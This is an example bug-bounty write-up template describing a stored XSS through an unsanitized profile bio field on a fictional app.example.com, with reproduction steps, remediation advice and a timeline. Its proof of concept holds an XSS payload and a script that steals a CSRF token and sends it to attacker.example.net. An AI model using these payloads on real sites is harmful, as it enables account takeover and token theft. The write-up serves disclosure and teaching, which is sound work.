---
title: "Example post: Stored XSS in Profile Bio on example.com"
date: 2026-10-10T10:00:00Z
description: "EXAMPLE write-up showing the layout — a stored XSS via an unsanitized profile bio field on a fictional target."
summary: "EXAMPLE write-up showing the layout — a stored XSS via an unsanitized profile bio field on a fictional target."
tags: ["XSS", "Stored XSS"]
severity: ["High"]
program: "Example Program (fictional)"
bounty: "N/A — example only"
example: true
---

## Summary

The profile **bio** field on `app.example.com` was rendered as raw HTML on the public profile page. Any user could store a script payload that executed in the browser of every visitor, including staff viewing profiles in the admin panel.

## Impact

- Arbitrary JavaScript execution in the context of `app.example.com`.
- Session-bound actions on behalf of victims (CSRF tokens readable from the DOM).
- Wormable: the payload could update the victim's own bio.

## Steps to Reproduce

1. Log in to `https://app.example.com` and open **Settings → Profile**.
2. Set the bio to the payload below and save.
3. Visit `https://app.example.com/u/attacker` from another account — the payload fires.

## Proof of Concept

Request that stores the payload:

```http
POST /api/v1/profile HTTP/1.1
Host: app.example.com
Content-Type: application/json
Cookie: session=REDACTED

{"bio": "<img src=x onerror=alert(document.domain)>"}
```

A less noisy payload that demonstrates impact by reading the CSRF token:

```js
fetch('/settings', { credentials: 'include' })
  .then(r => r.text())
  .then(html => {
    const token = html.match(/name="csrf" value="([^"]+)"/)[1];
    navigator.sendBeacon('https://attacker.example.net/c', token);
  });
```

## Remediation

- Encode user-controlled output by default (the template used `|safe`).
- Sanitize rich-text fields server-side with an allow-list (e.g. DOMPurify / bleach).
- Add a strict `Content-Security-Policy` without `unsafe-inline`.

## Timeline

| Date | Event |
|------|-------|
| 2026-01-01 | Reported (example) |
| 2026-01-02 | Triaged (example) |
| 2026-01-10 | Fixed (example) |

## Bounty

N/A — this is a fictional example post.
